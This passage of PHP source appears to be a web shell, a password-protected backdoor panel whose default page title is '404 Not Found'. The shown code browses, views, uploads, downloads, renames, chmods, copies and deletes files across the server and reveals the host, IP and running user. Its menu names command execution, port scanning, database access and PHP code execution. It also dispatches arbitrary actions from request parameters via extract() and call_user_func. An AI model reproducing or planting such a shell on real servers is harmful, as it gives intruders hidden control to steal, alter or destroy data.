    </span>
    <span></span>
    <span></span>
    <span></span>
     <span></span>
  </dd>
  {file}
 </dl>
HTML;
        $return_file = <<<HTML
  <!-- file -->
  <dd class="{className}" onmouseover="this.className='focus';" onmouseout="this.className='{className}';">
    <span class="in">
     <input name="{return_link}" type="checkbox" onclick="ajax(this.name,3)">
    </span>
    <span>
    <a href="javascript:;;;" name="{return_link}" onclick="{return_onclick}">{return_file}</a>
    </span>
    <span>
     <a href="javascript:;;;" name="{return_link}" onclick="ajax(this.name,2)">{return_time}</a>
    </span>
    <span>{return_size}</span>
    <span>
     <a href="javascript:;;;" name="{return_link}" onclick="fileperm(this.name,1)">{return_chmod}</a> / 
     <a href="javascript:;;;" name="{return_link}">{return_perms}</a>
    </span>
    <span>
     {is_folder}
   </span>
  </dd>
HTML;
        $document = array_merge($dir, $files);
        foreach ($document as $i => $gbk) {
            $utf8 = self::convert_to_utf8($gbk);
            $utf8_file = self::convert_to_utf8($file);
            $className = $i % 2 ? "dd" : "fff";
            if (is_dir($file . $gbk)) {
                $return_onclick = "ajax(this.name,1)";
                $return_folder = sprintf('
            <a href="javascript:;;;" name="%s" onclick="fileperm(this.name,2)">重命名</a>', urlencode($utf8_file . $utf8));
            }
            if (is_file($file . $gbk)) {
                $return_onclick = "view(this.name)";
                $return_folder = sprintf('
            <a href="javascript:;;;" name="%s" onclick="ajax(this.name,4)">下载</a> | 
            <a href="javascript:;;;" name="%s" onclick="fileperm(this.name,3)">复制</a> | 
            <a href="javascript:;;;" name="%s" onclick="edit()">编辑</a> | 
            <a href="javascript:;;;" name="%s" onclick="fileperm(this.name,2)">重命名</a>', urlencode($utf8_file . $utf8), urlencode($utf8_file . $utf8), urlencode($utf8_file . $utf8), urlencode($utf8_file . $utf8));
            }
            $search = array('{className}', '{return_file}', '{return_time}', '{return_size}', '{return_chmod}', '{return_perms}', '{return_link}', '{return_onclick}', '{is_folder}');
            $replace = array($className, $utf8, self::perms($file . $gbk, 3), self::perms($file . $gbk, 4), self::perms($file . $gbk, 1), self::perms($file . $gbk, 2), urlencode($utf8_file . $utf8), $return_onclick, $return_folder);
            $directory['html'] .= str_replace($search, $replace, $return_file);
        }
        $directory['node_data'] = str_replace(array('{file}', '{back}'), array($directory['html'], urlencode(str_replace('\\\\', '/', dirname(self::convert_to_utf8($file))))), $return);
        $pages = str_replace('{pages}', $_page, $_pages);
        $directory['pages'] = $nums > 1 ? $pages : '';
        unset($directory['html'], $_pages);
        $directory['folder'] = count($dir);
        $directory['file'] = count($files);
        $directory['time'] = self::G('runtime', 'end');
        $directory['listdir'] = self::uppath($file);
        $directory['memory'] = self::byte_format(memory_get_peak_usage());
        $directory['disktotal'] = self::byte_format(disk_total_space($file));
        if (true == $msg) {
            $directory['error'] = $msg;
        }
        unset($dir, $files);
        if (!ob_start("ob_gzhandler")) {
            ob_start();
        }
        clearstatcache();
        echo json_encode($directory);
        // print_r(array_unique($directory));
        ob_end_flush();
        unset($directory);
        exit;
    }
    function view()
    {
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
        header("Content-type:text/html;charset=UTF-8");
        $file = urldecode(self::convert_to_utf8($_POST["file"], 'utf8'));
        ob_start();
        $path = pathinfo($file);
        //$path['extension'] = is_null($path['extension']) ? null :$path['extension'];
        if (filesize($file) > 1048576) {
            exit;
        }
        if (in_array(strtolower($path['extension']), array('exe', 'dat', 'mp3', 'rmvb', 'jpg', 'png', 'gif', 'swf', 'gz', 'bz2', 'tar', 'sys', 'dll', 'so', 'bin', 'pdf', 'chm', 'doc', 'xls', 'wps', 'ogg', 'mp4', 'flv', 'ppt', 'zip', 'iso', 'msi'))) {
            exit;
        }
        $c = self::convert_to_utf8(file_get_contents($file));
        if (!ob_start("ob_gzhandler")) {
            ob_start();
        }
        //highlight_string($c);
        clearstatcache();
        $c = htmlspecialchars($c);
        echo "<code><pre>{$c}<pre></code>";
        ob_end_flush();
        exit;
    }
    function _mkdir()
    {
        if ($_POST['dir']) {
            $mkdir = $_COOKIE['PATH'] . self::convert_to_utf8($_POST['dir'], 'utf8');
            if (true == @mkdir($mkdir, 0777)) {
                $_POST['dir'] = $_COOKIE['PATH'];
                self::show('文件夹创建成功');
            } else {
                die('{"error":"文件夹创建失败"}');
            }
        }
    }
    function chmod()
    {
        if ($_POST['file'] && $_POST['perm']) {
            $file = urldecode(self::convert_to_utf8($_POST["file"], 'utf8'));
            $perm = base_convert($_POST['perm'], 8, 10);
            if (true == @chmod($file, $perm)) {
                $_POST['dir'] = $_COOKIE['PATH'];
                self::show('权限修改成功');
            } else {
                die('{"error":"文件修改失败"}');
            }
        }
    }
    function rename()
    {
        if ($_POST['file'] && $_POST['newname']) {
            $file = urldecode(self::convert_to_utf8($_POST["file"], 'utf8'));
            $newname = $_COOKIE['PATH'] . self::convert_to_utf8($_POST['newname'], 'utf8');
            if (true == @rename($file, $newname)) {
                $_POST['dir'] = $_COOKIE['PATH'];
                self::show('文件重命名成功');
            } else {
                die('{"error":"文件修改失败"}');
            }
        }
    }
    function upload()
    {
        $file = $_COOKIE['PATH'] . basename($_FILES['userfile']['name']);
        if (true == @move_uploaded_file($_FILES['userfile']['tmp_name'], self::convert_to_utf8($file, 'utf8'))) {
            exit('<script>
          parent.ajax();
          parent.$("load").style.display = "block";
          parent.$("load").innerHTML = "上传成功";
        </script>');
        } else {
            exit('<script>
         parent.$("load").style.display = "block";
         parent.$("load").innerHTML = "上传失败";
         parent.sideOut(parent.$("load"),1500);
        </script>');
        }
    }
    function copyfile()
    {
        if ($_POST['file'] && $_POST['copyfile']) {
            $file = urldecode(self::convert_to_utf8($_POST["file"], 'utf8'));
            $newname = self::convert_to_utf8($_POST['copyfile'], 'utf8');
            if (true == @copy($file, $newname)) {
                die('{"error":"文件拷贝成功"}');
            } else {
                die('{"error":"文件拷贝失败"}');
            }
        }
    }
    function delete()
    {
        $file = urldecode(self::convert_to_utf8($_POST["file"], 'utf8'));
        if (is_file($file)) {
            if (true == @unlink($file)) {
                $_POST['dir'] = $_COOKIE['PATH'];
                self::show('文件删除成功');
            } else {
                die('{"error":"文件删除失败"}');
            }
        }
        if (is_dir($file)) {
            if (true == @rmdir($file)) {
                $_POST['dir'] = $_COOKIE['PATH'];
                self::show('文件夹删除成功');
            } else {
                die('{"error":"文件夹删除失败"}');
            }
        }
    }
    function download()
    {
        $filename = urldecode(self::convert_to_utf8($_GET["file"], 'utf8'));
        if (file_exists($filename)) {
            header("Cache-Control: no-cache, must-revalidate");
            header("Pragma: no-cache");
            header("Content-Disposition: attachment; filename=" . basename($filename));
            header("Content-Length: " . filesize($filename));
            header("Content-Type: application/force-download");
            header('Content-Description: File Transfer');
            header('Content-Encoding: none');
            header("Content-Transfer-Encoding: binary");
            @readfile($filename);
            exit;
        }
    }
    protected static function uppath($path)
    {
        $return = '';
        $path = self::convert_to_utf8(rtrim($path, '/'));
        if (strpos($path, "/") == 0) {
            return sprintf('<a href="javascript:;;;" name="%s" onclick="ajax(this.name,1)">%s</a>', $path, ucfirst($path));
        } else {
            $array = explode("/", $path);
            foreach ($array as $i => $value) {
                if ($i == 0) {
                    $path = $value;
                }
                if ($i > 0) {
                    $path .= sprintf('/%s', $array[$i]);
                }
                $return .= sprintf('<a href="javascript:;;;" name="%s" onclick="ajax(this.name,1)">%s</a> ', $path, ucfirst($value));
            }
            return $return;
        }
    }
    protected static function perms($file, $type = '1')
    {
        if ($type == 1) {
            return substr(sprintf('%o', fileperms($file)), -4);
        }
        if ($type == 2) {
            return self::getperms($file);
        }
        if ($type == 3) {
            return date('Y-m-d h:i:s', filemtime($file));
        }
        if ($type == 4) {
            return is_dir($file) ? 'directory' : self::byte_format(sprintf("%u", filesize($file)));
        }
    }
    protected static function headers()
    {
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
        $eof = <<<HTML
<div id="load">
</div>
<div id="upload">
<div id="upfile">
<p></p><p></p><p><a href="javascript:;;;" id="close_file">\xe7\x82\xb9\xe6\x88\x91\xe5\x85\xb3\xe9\x97\xad</a></p>
<form action="" id="form1" name="form1" encType="multipart/form-data"  method="post" target="hidden_frame">
    <input name="action" value="upload" type="hidden" />
    <input type="file" id="userfile" name="userfile">  
    <INPUT id="_file" type="button" value="\xe4\xb8\x8a\xe4\xbc\xa0\xe6\x96\x87\xe4\xbb\xb6">         
    <iframe name='hidden_frame' id="hidden_frame" style='display:none'></iframe>  
</form>  
</div>
</div>
<div id="open">
<div style="position:relative;">
<div id="close">\xe5\x85\xb3\xe9\x97\xad</div>
</div>
<div id="show_file">
</div>
</div>
<div id="header">
  <div class="left">
  {host}({ip})
  </div>
  <div class="right">
  OS:{uname} {software} php {php_version}
  </div>
</div>
<div id="menu">
    {menu}
</div>
<div id="content">
<h2>\xe6\x96\x87\xe4\xbb\xb6\xe7\xae\xa1\xe7\x90\x86 - \xe5\xbd\x93\xe5\x89\x8d\xe7\xa3\x81\xe7\x9b\x98\xe7\xa9\xba\xe9\x97\xb4 <span id="disktotal"></span> \xe8\xbf\x90\xe8\xa1\x8c\xe7\x94\xa8\xe6\x88\xb7:{whoami}</h2>
  <div id="base">
    <div class="cdrom">
      <span id="listdir"></span>
    </div>
    <div class="cdrom">
      {cdrom}
    </div>
  </div>
  <div class="h"></div>
  <div id="base2">
    <div class="cdrom">
      {action}
    </div>
    <div class="cdrom">
      \xe6\x9f\xa5\xe6\x89\xbe\xe6\x96\x87\xe4\xbb\xb6(\xe5\xbd\x93\xe5\x89\x8d\xe8\xb7\xaf\xe5\xbe\x84): <input class="input" name="findstr" value="" type="text" /> <input class="bt" value="\xe6\x9f\xa5\xe6\x89\xbe" type="submit" />
    </div>
  </div>
  <!-- return -->
  <div id="show">
  </div>
  <div id="pages">
  </div>
  <!-- end -->
</div> 
<div class="h"></div>
<div id="footer">
  <span style="float:right;">
     Processed in <span id="runtime"></span> second(s) {gzip} usage:<span id="memory">{memory}</span>
  </span>
  Powered by {copyright}
  . Copyright (C) 2010-2012
   All Rights Reserved.
</div>
HTML;
        $actions[] = array('name' => '网站目录', 'url' => urlencode($_SERVER['DOCUMENT_ROOT']), 'type' => 1);
        $actions[] = array('name' => '文件目录', 'url' => urlencode("/var/www/html"), 'type' => 1);
        $actions[] = array('name' => '创建文件夹', 'url' => 'null', 'type' => '5');
        $actions[] = array('name' => '创建文件', 'url' => '2', 'type' => '2');
        $actions[] = array('name' => '上传文件', 'url' => 'null', 'type' => '6');
        $menus[] = array('name' => '退出', 'url' => 'action=logout', 'type' => 'null');
        $menus[] = array('name' => '文件管理', 'url' => urlencode("/var/www/html"), 'type' => 1);
        $menus[] = array('name' => '数据库操作', 'url' => '2', 'type' => '2');
        $menus[] = array('name' => '运行命令', 'url' => '2', 'type' => '2');
        $menus[] = array('name' => 'PHP相关', 'url' => '2', 'type' => '2');
        $menus[] = array('name' => '端口扫描', 'url' => '2', 'type' => '2');
        $menus[] = array('name' => 'PHP命令', 'url' => '2', 'type' => '2');
        foreach ($menus as $key => $value) {
            $menu .= sprintf('<a href="javascript:;;;" name="%s" onclick=ajax(this.name,%s)>%s</a> | ', $value['url'], $value['type'], $value['name']);
        }
        foreach ($actions as $key => $value) {
            $action .= sprintf('<a href="javascript:;;;" name="%s" onclick=ajax(this.name,%s)>%s</a> | ', $value['url'], $value['type'], $value['name']);
        }
        $serach = array('{title}', '{host}', '{ip}', '{uname}', '{software}', '{php_version}', '{menu}', '{copyright}', '{cdrom}', '{action}', '{gzip}', '{memory}', '{js}', '{css}', '{whoami}');
        if (!function_exists('posix_getegid')) {
            $user = @get_current_user();
            $uid = @getmyuid();
            $gid = @getmygid();
            $group = "?";
        } else {
            $uid = @posix_getpwuid(@posix_geteuid());
            $gid = @posix_getgrgid(@posix_getegid());
            $user = $uid['name'];
            $uid = $uid['uid'];
            $group = $gid['name'];
            $gid = $gid['gid'];
        }
        $replace = array(title, $_SERVER['HTTP_HOST'], $_SERVER['SERVER_ADDR'], php_uname('s'), $_SERVER["SERVER_SOFTWARE"], PHP_VERSION, trim($menu, '| '), copyright, self::disk(), trim($action, '| '), gzip, self::byte_format(memory_get_peak_usage()), self::js(), self::css(), $uid . ' ( ' . $user . ' ) / Group: ' . $gid . ' ( ' . $group . ' )');
        $eof = str_replace($serach, $replace, $eof);
        $json['status'] = 'ok';
        $json['data'] = $eof;
        if (!ob_start("ob_gzhandler")) {
            ob_start();
        }
        echo json_encode($json);
        ob_end_flush();
        exit;
    }
    protected static function disk()
    {
        if (is_win) {
            $cdrom = range('A', 'Z');
            foreach ($cdrom as $disk) {
                $disk = sprintf("%s%s", $disk, ':');
                if (is_readable($disk)) {
                    $return .= sprintf('<a href="javascript:;;;" name="%s" onclick="ajax(this.name,1)">DISK %s</a> | ', $disk, $disk);
                }
            }
            return trim($return, "| ");
        } else {
            if (function_exists("scandir")) {
                $cdrom = scandir('/');
            } elseif (function_exists("glob")) {
                foreach (glob('/*') as $ff) {
                    $cdrom[] = basename($ff);
                }
            }
            foreach ($cdrom as $disk) {
                if ($disk == '.' || $disk == '..') {
                    continue;
                }
                $disk = sprintf("%s%s", '/', $disk);
                if (is_readable($disk)) {
                    if (is_dir($disk)) {
                        $return .= sprintf('<a href="javascript:;;;" name="%s" onclick="ajax(this.name,1)">%s</a> | ', urlencode($disk), str_replace('/', '', $disk));
                    }
                }
            }
            return trim($return, "| ");
        }
    }
    protected static function G($start, $end = '', $dec = 6)
    {
        static $_info = array();
        if (is_float($end)) {
            // 记录时间
            $_info[$start] = $end;
        } elseif (!empty($end)) {
            // 统计时间
            if (!isset($_info[$end])) {
                $_info[$end] = microtime(true);
            }
            return number_format($_info[$end] - $_info[$start], $dec);
        } else {
            // 记录时间
            $_info[$start] = microtime(true);
        }
    }
    protected static function authentication()
    {
        if (true) {
            //if(!empty($_POST['pwd']) && !preg_match('/^[a-z0-9]+$/',$_POST['pwd'])) exit;
            if (!empty($_POST['pwd']) && strlen(password) == 32) {
                $password = hash(crypt, $_POST['pwd']);
            } else {
                $password = $_POST['pwd'];
            }
            if (true == $password && $password !== password) {
                die('{"error":"密码错误!"}');
            }
            if (true == $password && $password == password) {
                setcookie('verify', $password, time() + 2592000);
                self::headers();
                exit;
            }
            if (!isset($_COOKIE['verify']) || empty($_COOKIE['verify']) || (string) $_COOKIE['verify'] !== password) {
                if ($_SERVER['HTTP_AJAX'] == 'true') {
                    die('{"status":"off"}');
                }
                self::login();
                exit;
            }
        }
        if ($_SERVER['HTTP_AJAX'] == 'true') {
            self::headers();
        }
    }
    public function logout()
    {
        setcookie('key', '', time() - 2592000);
        unset($_COOKIE['key']);
        session_start();
        session_destroy();
        $login = <<<LOGIN
  <div id="load">
   </div>
   <div class="h"></div>
   <div id="login">
     <span style="font:11px Verdana;">
       Password: 
     </span>
     <input id="pwd" name="pwd" type="password" size="20">
     <input id="login_open" type="button" value="Login">
  </div>
LOGIN;
        $json['status'] = 'close';
        $json['data'] = $login;
        die(json_encode($json));
    }
    static function login()
    {
        $login = <<<LOGIN
<!DOCTYPE HTML>
<head>
<meta http-equiv="content-type" content="text/html" />
<meta http-equiv="content-type" charset="UTF-8" />
<title>{title}</title>
{css}
{js}
</head>
<body>
  <div id="load">
   </div>
   <div class="h"></div>
   <div id="login">
     <span style="font:11px Verdana;">
       Password: 
     </span>
     <input id="pwd" name="pwd" type="password" size="20">
     <input id="login_open" type="button" value="Login">
  </div>
</body>
</html>
LOGIN;
        $search = array('{css}', '{title}', '{js}');
        $replace = array(self::css(), title, self::js());
        echo str_replace($search, $replace, $login);
    }
    protected static function getperms($path)
    {
        $perms = fileperms($path);
        if (($perms & 0xc000) == 0xc000) {
            $info = 's';
        } elseif (($perms & 0xa000) == 0xa000) {
            $info = 'l';
        } elseif (($perms & 0x8000) == 0x8000) {
            $info = '-';
        } elseif (($perms & 0x6000) == 0x6000) {
            $info = 'b';
        } elseif (($perms & 0x4000) == 0x4000) {
            $info = 'd';
        } elseif (($perms & 0x2000) == 0x2000) {
            $info = 'c';
        } elseif (($perms & 0x1000) == 0x1000) {
            $info = 'p';
        } else {
            $info = '?????????';
            return "?????????";
        }
        $info .= $perms & 0x100 ? 'r' : '-';
        $info .= $perms & 0x80 ? 'w' : '-';
        $info .= $perms & 0x40 ? $perms & 0x800 ? 's' : 'x' : ($perms & 0x800 ? 'S' : '-');
        $info .= $perms & 0x20 ? 'r' : '-';
        $info .= $perms & 0x10 ? 'w' : '-';
        $info .= $perms & 0x8 ? $perms & 0x400 ? 's' : 'x' : ($perms & 0x400 ? 'S' : '-');
        $info .= $perms & 0x4 ? 'r' : '-';
        $info .= $perms & 0x2 ? 'w' : '-';
        $info .= $perms & 0x1 ? $perms & 0x200 ? 't' : 'x' : ($perms & 0x200 ? 'T' : '-');
        return $info;
    }
    protected static function byte_format($size, $dec = 2)
    {
        $a = array("B", "KB", "MB", "GB", "TB", "PB");
        $pos = 0;
        while ($size >= 1024) {
            $size /= 1024;
            $pos++;
        }
        return round($size, $dec) . "" . $a[$pos];
    }
    protected static function convert_to_utf8($str, $type = 'gbk')
    {
        if (function_exists('iconv')) {
            if ($type == 'gbk') {
                if (false == @iconv("GBK", "UTF-8", $str)) {
                    return $str;
                } else {
                    return @iconv("GBK", "UTF-8", $str);
                }
            }
            if ($type == 'utf8') {
                if (false == @iconv("UTF-8", "GBK", $str)) {
                    return $str;
                } else {
                    return @iconv("UTF-8", "GBK", $str);
                }
            }
        } else {
            return $str;
        }
    }
}
function run()
{
    set_time_limit(0);
    ini_set('memory_limit', -1);
    if (!defined('password')) {
        define('password', '');
    }
    if (!defined('title')) {
        define('title', '404 Not Found');
    }
    if (!defined('copyright')) {
        define('copyright', 'E');
    }
    define('self', $_SERVER["SCRIPT_NAME"]);
    define('crypt', 'ripemd128');
    define('__ROOT__', $_SERVER["DOCUMENT_ROOT"]);
    define('is_win', 'win' == substr(strtolower(PHP_OS), 0, 3));
    date_default_timezone_set('asia/shanghai');
    define('gzip', function_exists("ob_gzhandler") ? 'gzip on' : 'gzip off');
    extract($_POST);
    extract($_GET);
    header("Cache-Control: no-cache, must-revalidate");
    header("Pragma: no-cache");
    project::init();
    $action = !empty($action) ? strtolower(rtrim($action, '/')) : 'login';
    if (!is_callable(array('project', $action))) {
        return false;
    }
    if (!method_exists('project', $action)) {
        return false;
    }
    call_user_func(array('project', $action));
}
//
